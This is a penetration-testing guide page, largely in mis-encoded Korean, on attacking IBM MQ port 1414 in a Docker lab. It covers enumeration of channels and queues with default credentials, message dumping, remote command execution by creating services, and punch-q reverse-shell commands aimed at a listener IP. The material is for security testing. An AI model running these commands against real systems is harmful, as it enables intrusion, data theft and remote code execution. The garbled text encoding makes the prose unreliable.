# 1414 - Pentesting IBM MQ

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic information

IBM MQëŠ” ë©”ì‹œì§€ íë¥¼ ê´€ë¦¬í•˜ê¸° ìœ„í•œ IBM ê¸°ìˆ ì…ë‹ˆë‹¤. ë‹¤ë¥¸ **ë©”ì‹œì§€ ë¸Œë¡œì»¤** ê¸°ìˆ ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ, ìƒì‚°ìì™€ ì†Œë¹„ì ê°„ì˜ ì •ë³´ë¥¼ ìˆ˜ì‹ , ì €ì¥, ì²˜ë¦¬ ë° ë¶„ë¥˜í•˜ëŠ” ë° ì „ë…í•˜ê³  ìˆìŠµë‹ˆë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ **IBM MQ TCP í¬íŠ¸ 1414ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤**.  
ë•Œë•Œë¡œ, HTTP REST APIëŠ” í¬íŠ¸ **9443**ì—ì„œ ë…¸ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.  
ë©”íŠ¸ë¦­(í”„ë¡¬í…Œìš°ìŠ¤)ì€ TCP í¬íŠ¸ **9157**ì—ì„œ ì ‘ê·¼í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

IBM MQ TCP í¬íŠ¸ 1414ëŠ” ë©”ì‹œì§€, í, ì±„ë„ ë“±ì„ ì¡°ì‘í•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆì§€ë§Œ, **ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì œì–´í•˜ëŠ” ë°ë„ ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

IBMì€ [https://www.ibm.com/docs/en/ibm-mq](https://www.ibm.com/docs/en/ibm-mq)ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë°©ëŒ€í•œ ê¸°ìˆ  ë¬¸ì„œë¥¼ ì œê³µí•©ë‹ˆë‹¤.

## Tools

ì‰¬ìš´ ìµìŠ¤í”Œë¡œì‡ì„ ìœ„í•œ ì¶”ì²œ ë„êµ¬ëŠ” **[punch-q](https://github.com/sensepost/punch-q)**ë¡œ, Dockerë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ ë„êµ¬ëŠ” Python ë¼ì´ë¸ŒëŸ¬ë¦¬ `pymqi`ë¥¼ ì ê·¹ì ìœ¼ë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤.

ë³´ë‹¤ ìˆ˜ë™ì ì¸ ì ‘ê·¼ì„ ìœ„í•´ Python ë¼ì´ë¸ŒëŸ¬ë¦¬ **[pymqi](https://github.com/dsuch/pymqi)**ë¥¼ ì‚¬ìš©í•˜ì„¸ìš”. [IBM MQ ì˜ì¡´ì„±](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc)ì´ í•„ìš”í•©ë‹ˆë‹¤.

### Installing pymqi

**IBM MQ ì˜ì¡´ì„±**ì„ ì„¤ì¹˜í•˜ê³  ë¡œë“œí•´ì•¼ í•©ë‹ˆë‹¤:

1. [https://login.ibm.com/](https://login.ibm.com/)ì—ì„œ ê³„ì •(IBMid)ì„ ìƒì„±í•©ë‹ˆë‹¤.
2. [https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc](https://www.ibm.com/support/fixcentral/swg/selectFixes?parent=ibm%7EWebSphere&product=ibm/WebSphere/WebSphere+MQ&release=9.0.0.4&platform=All&function=fixId&fixids=9.0.0.4-IBM-MQC-*,9.0.0.4-IBM-MQ-Install-Java-All,9.0.0.4-IBM-MQ-Java-InstallRA&useReleaseAsTarget=true&includeSupersedes=0&source=fc)ì—ì„œ IBM MQ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë‹¤ìš´ë¡œë“œí•©ë‹ˆë‹¤. Linux x86_64ì˜ ê²½ìš° **9.0.0.4-IBM-MQC-LinuxX64.tar.gz**ì…ë‹ˆë‹¤.
3. ì••ì¶•ì„ í’‰ë‹ˆë‹¤ (`tar xvzf 9.0.0.4-IBM-MQC-LinuxX64.tar.gz`).
4. `sudo ./mqlicense.sh`ë¥¼ ì‹¤í–‰í•˜ì—¬ ë¼ì´ì„¼ìŠ¤ ì¡°ê±´ì— ë™ì˜í•©ë‹ˆë‹¤.

> Kali Linuxë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°, íŒŒì¼ `mqlicense.sh`ë¥¼ ìˆ˜ì •í•©ë‹ˆë‹¤: ë‹¤ìŒ ì¤„(105-110í–‰)ì„ ì œê±°/ì£¼ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤:
>
>```bash
>if [ ${BUILD_PLATFORM} != `uname`_`uname ${UNAME_FLAG}` ]
>  then
>    echo "ERROR: This package is incompatible with this system"
>    echo "       This package was built for ${BUILD_PLATFORM}"
>    exit 1
>fi
>```

5. ì´ëŸ¬í•œ íŒ¨í‚¤ì§€ë¥¼ ì„¤ì¹˜í•©ë‹ˆë‹¤:
```bash
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesRuntime-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesClient-9.0.0-4.x86_64.rpm
sudo rpm --prefix /opt/mqm -ivh --nodeps --force-debian MQSeriesSDK-9.0.0-4.x86_64.rpm
```
6. ê·¸ëŸ° ë‹¤ìŒ, ë‹¤ë¥¸ ë„êµ¬ë¥¼ ì´ëŸ¬í•œ ì¢…ì†ì„±ì„ ì‚¬ìš©í•˜ì—¬ ì‹¤í–‰í•˜ê¸° **ì „ì—** `.so` íŒŒì¼ì„ LDì— ì„ì‹œë¡œ ì¶”ê°€í•©ë‹ˆë‹¤: `export LD_LIBRARY_PATH=/opt/mqm/lib64`.

ê·¸ëŸ° ë‹¤ìŒ, í”„ë¡œì íŠ¸ [**pymqi**](https://github.com/dsuch/pymqi)ë¥¼ í´ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: í¥ë¯¸ë¡œìš´ ì½”ë“œ ì¡°ê°, ìƒìˆ˜ ë“±ì„ í¬í•¨í•˜ê³  ìˆìŠµë‹ˆë‹¤... ë˜ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì§ì ‘ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: `pip install pymqi`.

### Using punch-q

#### With Docker

ê°„ë‹¨íˆ ì‚¬ìš©í•˜ì„¸ìš”: `sudo docker run --rm -ti leonjza/punch-q`.

#### Without Docker

í”„ë¡œì íŠ¸ [**punch-q**](https://github.com/sensepost/punch-q)ë¥¼ í´ë¡ í•œ ë‹¤ìŒ, ì„¤ì¹˜ë¥¼ ìœ„í•´ readmeë¥¼ ë”°ë¥´ì„¸ìš” (`pip install -r requirements.txt && python3 setup.py install`).

ê·¸ í›„, `punch-q` ëª…ë ¹ìœ¼ë¡œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## Enumeration

**punch-q** ë˜ëŠ” **pymqi**ë¥¼ ì‚¬ìš©í•˜ì—¬ **í ê´€ë¦¬ì ì´ë¦„, ì‚¬ìš©ì, ì±„ë„ ë° í**ë¥¼ ì—´ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Queue Manager

ë•Œë•Œë¡œ, í ê´€ë¦¬ì ì´ë¦„ì„ ì–»ëŠ” ê²ƒì— ëŒ€í•œ ë³´í˜¸ê°€ ì—†ìŠµë‹ˆë‹¤:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 discover name
Queue Manager name: MYQUEUEMGR
```
### Channels

**punch-q**ëŠ” ê¸°ì¡´ ì±„ë„ì„ ì°¾ê¸° ìœ„í•´ ë‚´ë¶€(ìˆ˜ì • ê°€ëŠ¥í•œ) ë‹¨ì–´ ëª©ë¡ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì‚¬ìš© ì˜ˆ:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd discover channels
"DEV.ADMIN.SVRCONN" exists and was authorised.
"SYSTEM.AUTO.SVRCONN" might exist, but user was not authorised.
"SYSTEM.DEF.SVRCONN" might exist, but user was not authorised.
```
ì¼ë¶€ IBM MQ ì¸ìŠ¤í„´ìŠ¤ê°€ **ì¸ì¦ë˜ì§€ ì•Šì€** MQ ìš”ì²­ì„ ìˆ˜ë½í•˜ë¯€ë¡œ `--username / --password`ê°€ í•„ìš”í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë¬¼ë¡ , ì ‘ê·¼ ê¶Œí•œì€ ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í•˜ë‚˜ì˜ ì±„ë„ ì´ë¦„(ì—¬ê¸°ì„œëŠ”: `DEV.ADMIN.SVRCONN`)ì„ ì–»ìœ¼ë©´, ë‹¤ë¥¸ ëª¨ë“  ì±„ë„ì„ ì—´ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì—´ê±°ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **pymqi**ì˜ ì´ ì½”ë“œ ìŠ¤ë‹ˆí« `code/examples/dis_channels.py`ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```python
import logging
import pymqi

logging.basicConfig(level=logging.INFO)

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

prefix = '*'

args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix}

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
response = pcf.MQCMD_INQUIRE_CHANNEL(args)
except pymqi.MQMIError as e:
if e.comp == pymqi.CMQC.MQCC_FAILED and e.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
logging.info('No channels matched prefix `%s`' % prefix)
else:
raise
else:
for channel_info in response:
channel_name = channel_info[pymqi.CMQCFC.MQCACH_CHANNEL_NAME]
logging.info('Found channel `%s`' % channel_name)

qmgr.disconnect()

```
... í•˜ì§€ë§Œ **punch-q**ëŠ” ê·¸ ë¶€ë¶„ë„ í¬í•¨í•˜ê³  ìˆìŠµë‹ˆë‹¤ (ë” ë§ì€ ì •ë³´ì™€ í•¨ê»˜!).
ë‹¤ìŒê³¼ ê°™ì´ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show channels -p '*'
Showing channels with prefix: "*"...

| Name                 | Type              | MCA UID | Conn Name | Xmit Queue | Description     | SSL Cipher |
|----------------------|-------------------|---------|-----------|------------|-----------------|------------|
| DEV.ADMIN.SVRCONN    | Server-connection |         |           |            |                 |            |
| DEV.APP.SVRCONN      | Server-connection | app     |           |            |                 |            |
| SYSTEM.AUTO.RECEIVER | Receiver          |         |           |            | Auto-defined by |            |
| SYSTEM.AUTO.SVRCONN  | Server-connection |         |           |            | Auto-defined by |            |
| SYSTEM.DEF.AMQP      | AMQP              |         |           |            |                 |            |
| SYSTEM.DEF.CLUSRCVR  | Cluster-receiver  |         |           |            |                 |            |
| SYSTEM.DEF.CLUSSDR   | Cluster-sender    |         |           |            |                 |            |
| SYSTEM.DEF.RECEIVER  | Receiver          |         |           |            |                 |            |
| SYSTEM.DEF.REQUESTER | Requester         |         |           |            |                 |            |
| SYSTEM.DEF.SENDER    | Sender            |         |           |            |                 |            |
| SYSTEM.DEF.SERVER    | Server            |         |           |            |                 |            |
| SYSTEM.DEF.SVRCONN   | Server-connection |         |           |            |                 |            |
| SYSTEM.DEF.CLNTCONN  | Client-connection |         |           |            |                 |            |
```
### Queues

**pymqi**(`dis_queues.py`)ì™€ í•¨ê»˜ ì½”ë“œ ìŠ¤ë‹ˆí«ì´ ìˆì§€ë§Œ **punch-q**ëŠ” íì— ëŒ€í•œ ë” ë§ì€ ì •ë³´ë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN show queues -p '*'
Showing queues with prefix: "*"...
| Created   | Name                 | Type   | Usage   | Depth  | Rmt. QM | Rmt. Qu | Description                       |
|           |                      |        |         |        | GR Name | eue Nam |                                   |
|           |                      |        |         |        |         | e       |                                   |
|-----------|----------------------|--------|---------|--------|---------|---------|-----------------------------------|
| 2023-10-1 | DEV.DEAD.LETTER.QUEU | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 | E                    |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.1          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.2          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
| 2023-10-1 | DEV.QUEUE.3          | Local  | Normal  | 0      |         |         |                                   |
| 0 18.35.1 |                      |        |         |        |         |         |                                   |
| 9         |                      |        |         |        |         |         |                                   |
# Truncated
```
## Exploit

### Dump messages

í(ë“¤)/ì±„ë„(ë“¤)ì„ ëŒ€ìƒìœ¼ë¡œ í•˜ì—¬ ë©”ì‹œì§€ë¥¼ ìŠ¤ë‹ˆí•‘í•˜ê±°ë‚˜ ë¤í”„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ë¹„íŒŒê´´ì  ì‘ì—…). *ì˜ˆì‹œ:*
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages sniff
```

```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN messages dump
```
**ëª¨ë“  ì‹ë³„ëœ íì— ëŒ€í•´ ë°˜ë³µí•˜ëŠ” ê²ƒì„ ì£¼ì €í•˜ì§€ ë§ˆì‹­ì‹œì˜¤.**

### ì½”ë“œ ì‹¤í–‰

> ê³„ì†í•˜ê¸° ì „ì— ëª‡ ê°€ì§€ ì„¸ë¶€ì •ë³´: IBM MQëŠ” ì—¬ëŸ¬ ë°©ë²•ìœ¼ë¡œ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: MQSC, PCF, Control Command. ì¼ë°˜ì ì¸ ëª©ë¡ì€ [IBM MQ ë¬¸ì„œ](https://www.ibm.com/docs/en/ibm-mq/9.2?topic=reference-command-sets-comparison)ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
> [**PCF**](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=commands-introduction-mq-programmable-command-formats) (***í”„ë¡œê·¸ë˜ë¨¸ë¸” ì»¤ë§¨ë“œ í¬ë§·***)ëŠ” ì¸ìŠ¤í„´ìŠ¤ì™€ ì›ê²©ìœ¼ë¡œ ìƒí˜¸ì‘ìš©í•˜ê¸° ìœ„í•´ ìš°ë¦¬ê°€ ì§‘ì¤‘í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. **punch-q**ì™€ ë”ë¶ˆì–´ **pymqi**ëŠ” PCF ìƒí˜¸ì‘ìš©ì„ ê¸°ë°˜ìœ¼ë¡œ í•©ë‹ˆë‹¤.
>
> PCF ëª…ë ¹ ëª©ë¡ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
> * [PCF ë¬¸ì„œì—ì„œ](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=reference-definitions-programmable-command-formats), ë°
> * [ìƒìˆ˜ì—ì„œ](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqcmd-command-codes).
>
> í¥ë¯¸ë¡œìš´ ëª…ë ¹ ì¤‘ í•˜ë‚˜ëŠ” `MQCMD_CREATE_SERVICE`ì´ë©°, ê·¸ ë¬¸ì„œëŠ” [ì—¬ê¸°](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-change-copy-create-service-multiplatforms)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸ìŠ¤í„´ìŠ¤ì˜ ë¡œì»¬ í”„ë¡œê·¸ë¨ì„ ê°€ë¦¬í‚¤ëŠ” `StartCommand`ë¥¼ ì¸ìˆ˜ë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤ (ì˜ˆ: `/bin/sh`).
>
> ë¬¸ì„œì—ëŠ” ì´ ëª…ë ¹ì— ëŒ€í•œ ê²½ê³ ë„ ìˆìŠµë‹ˆë‹¤: *"ì£¼ì˜: ì´ ëª…ë ¹ì€ ì‚¬ìš©ìê°€ mqm ê¶Œí•œìœ¼ë¡œ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì„ ì‚¬ìš©í•  ê¶Œí•œì´ ë¶€ì—¬ë˜ë©´, ì•…ì˜ì ì´ê±°ë‚˜ ë¶€ì£¼ì˜í•œ ì‚¬ìš©ìê°€ ì‹œìŠ¤í…œì´ë‚˜ ë°ì´í„°ë¥¼ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆëŠ” ì„œë¹„ìŠ¤ë¥¼ ì •ì˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, í•„ìˆ˜ íŒŒì¼ì„ ì‚­ì œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤."*
>
> *ì°¸ê³ : í•­ìƒ IBM MQ ë¬¸ì„œ(ê´€ë¦¬ ì°¸ì¡°)ì— ë”°ë¥´ë©´, ì„œë¹„ìŠ¤ ìƒì„±ì„ ìœ„í•œ ë™ë“±í•œ MQSC ëª…ë ¹(`DEFINE SERVICE`)ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ `/admin/action/qmgr/{qmgrName}/mqsc`ì— HTTP ì—”ë“œí¬ì¸íŠ¸ê°€ ìˆìŠµë‹ˆë‹¤. ì´ ì¸¡ë©´ì€ ì•„ì§ ì—¬ê¸°ì—ì„œ ë‹¤ë£¨ì–´ì§€ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.*

ì›ê²© í”„ë¡œê·¸ë¨ ì‹¤í–‰ì„ ìœ„í•œ PCFë¥¼ ì‚¬ìš©í•œ ì„œë¹„ìŠ¤ ìƒì„±/ì‚­ì œëŠ” **punch-q**ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

**ì˜ˆì œ 1**
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/sh" --args "-c id"
```
> IBM MQì˜ ë¡œê·¸ì—ì„œ ëª…ë ¹ì´ ì„±ê³µì ìœ¼ë¡œ ì‹¤í–‰ë˜ì—ˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
>
> ```bash
> 2023-10-10T19:13:01.713Z AMQ5030I: The Command '808544aa7fc94c48' has started. ProcessId(618). [ArithInsert1(618), CommentInsert1(808544aa7fc94c48)]
> ```

ê¸°ê³„ì—ì„œ ê¸°ì¡´ í”„ë¡œê·¸ë¨ì„ ë‚˜ì—´í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤ (ì—¬ê¸°ì„œ `/bin/doesnotexist` ... ì¡´ì¬í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤):
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command execute --cmd "/bin/doesnotexist" --arg
s "whatever"
Command: /bin/doesnotexist
Arguments: -c id
Service Name: 6e3ef5af652b4436

Creating service...
Starting service...
The program '/bin/doesnotexist' is not available on the remote system.
Giving the service 0 second(s) to live...
Cleaning up service...
Done
```
**í”„ë¡œê·¸ë¨ ì‹¤í–‰ì´ ë¹„ë™ê¸°ì ì´ë¼ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”. ë”°ë¼ì„œ ìµìŠ¤í”Œë¡œì‡ì„ í™œìš©í•˜ê¸° ìœ„í•´ ë‘ ë²ˆì§¸ í•­ëª©ì´ í•„ìš”í•©ë‹ˆë‹¤** ***(ë¦¬ë²„ìŠ¤ ì…¸ì„ ìœ„í•œ ë¦¬ìŠ¤ë„ˆ, ë‹¤ë¥¸ ì„œë¹„ìŠ¤ì—ì„œì˜ íŒŒì¼ ìƒì„±, ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•œ ë°ì´í„° ìœ ì¶œ ...)***

**ì˜ˆì œ 2**

ì‰¬ìš´ ë¦¬ë²„ìŠ¤ ì…¸ì„ ìœ„í•´, **punch-q**ëŠ” ë‘ ê°€ì§€ ë¦¬ë²„ìŠ¤ ì…¸ í˜ì´ë¡œë“œë¥¼ ì œì•ˆí•©ë‹ˆë‹¤:

* í•˜ë‚˜ëŠ” bash
* í•˜ë‚˜ëŠ” perl

*ë¬¼ë¡  `execute` ëª…ë ¹ì–´ë¡œ ì‚¬ìš©ì ì •ì˜ í˜ì´ë¡œë“œë¥¼ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.*

bashì˜ ê²½ìš°:
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
```markdown
perlì˜ ê²½ìš°:
```
```bash
â¯ sudo docker run --rm -ti leonjza/punch-q --host 172.17.0.2 --port 1414 --username admin --password passw0rd --channel DEV.ADMIN.SVRCONN command reverse -i 192.168.0.16 -p 4444
```
### Custom PCF

IBM MQ ë¬¸ì„œë¥¼ ì‚´í´ë³´ê³  **pymqi** íŒŒì´ì¬ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì§ì ‘ ì‚¬ìš©í•˜ì—¬ **punch-q**ì— êµ¬í˜„ë˜ì§€ ì•Šì€ íŠ¹ì • PCF ëª…ë ¹ì„ í…ŒìŠ¤íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**Example:**
```python
import pymqi

queue_manager = 'MYQUEUEMGR'
channel = 'DEV.ADMIN.SVRCONN'
host = '172.17.0.2'
port = '1414'
conn_info = '%s(%s)' % (host, port)
user = 'admin'
password = 'passw0rd'

qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
pcf = pymqi.PCFExecute(qmgr)

try:
# Replace here with your custom PCF args and command
# The constants can be found in pymqi/code/pymqi/CMQCFC.py
args = {pymqi.CMQCFC.xxxxx: "value"}
response = pcf.MQCMD_CUSTOM_COMMAND(args)
except pymqi.MQMIError as e:
print("Error")
else:
# Process response

qmgr.disconnect()

```
If you cannot find the constant names, you can refer to the [IBM MQ documentation](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=constants-mqca-character-attribute-selectors).

> *Example for [`MQCMD_REFRESH_CLUSTER`](https://www.ibm.com/docs/en/ibm-mq/9.3?topic=formats-mqcmd-refresh-cluster-refresh-cluster) (Decimal = 73). It needs the parameter `MQCA_CLUSTER_NAME` (Decimal = 2029) which can be `*` (Doc: ):*
>
> ```python
> import pymqi
>
> queue_manager = 'MYQUEUEMGR'
> channel = 'DEV.ADMIN.SVRCONN'
> host = '172.17.0.2'
> port = '1414'
> conn_info = '%s(%s)' % (host, port)
> user = 'admin'
> password = 'passw0rd'
>
> qmgr = pymqi.connect(queue_manager, channel, conn_info, user, password)
> pcf = pymqi.PCFExecute(qmgr)
>
> try:
>     args = {2029: "*"}
>     response = pcf.MQCMD_REFRESH_CLUSTER(args)
> except pymqi.MQMIError as e:
>     print("Error")
> else:
>     print(response)
>
> qmgr.disconnect()
> ```

## Testing environment

If you want to test the IBM MQ behavior and exploits, you can set up a local environment based on Docker:

1. ibm.com ë° cloud.ibm.comì— ê³„ì •ì´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.
2. ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ ì»¨í…Œì´ë„ˆí™”ëœ IBM MQë¥¼ ìƒì„±í•©ë‹ˆë‹¤:
```bash
sudo docker pull icr.io/ibm-messaging/mq:9.3.2.0-r2
sudo docker run -e LICENSE=accept -e MQ_QMGR_NAME=MYQUEUEMGR -p1414:1414 -p9157:9157 -p9443:9443 --name testing-ibmmq icr.io/ibm-messaging/mq:9.3.2.0-r2
```
ê¸°ë³¸ì ìœ¼ë¡œ ì¸ì¦ì´ í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©°, ì‚¬ìš©ì ì´ë¦„ì€ `admin`ì´ê³  ë¹„ë°€ë²ˆí˜¸ëŠ” `passw0rd`ì…ë‹ˆë‹¤ (í™˜ê²½ ë³€ìˆ˜ `MQ_ADMIN_PASSWORD`).  
ì—¬ê¸°ì„œ í ê´€ë¦¬ì ì´ë¦„ì€ `MYQUEUEMGR`ë¡œ ì„¤ì •ë˜ì–´ ìˆìŠµë‹ˆë‹¤ (ë³€ìˆ˜ `MQ_QMGR_NAME`).

IBM MQê°€ ì‹¤í–‰ ì¤‘ì´ë©° í¬íŠ¸ê°€ ë…¸ì¶œë˜ì–´ ìˆì–´ì•¼ í•©ë‹ˆë‹¤:
```bash
â¯ sudo docker ps
CONTAINER ID   IMAGE                                COMMAND                  CREATED         STATUS                    PORTS                                                                    NAMES
58ead165e2fd   icr.io/ibm-messaging/mq:9.3.2.0-r2   "runmqdevserver"         3 seconds ago   Up 3 seconds              0.0.0.0:1414->1414/tcp, 0.0.0.0:9157->9157/tcp, 0.0.0.0:9443->9443/tcp   testing-ibmmq
```
> IBM MQ ë„ì»¤ ì´ë¯¸ì§€ì˜ ì´ì „ ë²„ì „ì€ ë‹¤ìŒì— ìˆìŠµë‹ˆë‹¤: https://hub.docker.com/r/ibmcom/mq/.

## References

* [mgeeky's gist - "Practical IBM MQ Penetration Testing notes"](https://gist.github.com/mgeeky/2efcd86c62f0fb3f463638911a3e89ec)
* [MQ Jumping - DEFCON 15](https://defcon.org/images/defcon-15/dc15-presentations/dc-15-ruks.pdf)
* [IBM MQ documentation](https://www.ibm.com/docs/en/ibm-mq)
